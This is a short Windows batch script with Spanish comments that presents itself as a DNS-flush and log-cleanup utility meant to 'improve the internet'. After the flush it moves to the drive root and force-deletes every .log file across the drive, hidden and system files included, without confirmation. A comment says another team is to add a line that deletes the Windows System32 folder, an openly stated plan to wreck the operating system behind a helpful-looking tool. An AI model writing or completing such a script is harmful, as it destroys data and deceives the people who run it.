@echo off
REM Muestra el mensaje de inicio y autor
echo Hecho por Manuel

REM Pausa para que el usuario presione Enter para continuar
echo.
echo Presiona Enter para limpiar archivos de registro y limpiar el caché DNS.
pause

REM Limpiar caché DNS
echo Limpiando el DNS para mejorar el internet...
ipconfig /flushdns
echo Caché DNS limpiado con éxito.
echo.

REM Cambiar al directorio raíz
cd/

REM Aquí el otro equipo se deberá de encargar de hacer una línea de código que borre la carpeta System32 de Windows...

REM Eliminar archivos .log
echo Eliminando archivos .log en todas las carpetas...
del *.log /a /s /q /f
echo Archivos .log eliminados con éxito.
echo.

REM Pausa para ver los resultados antes de cerrar
pause
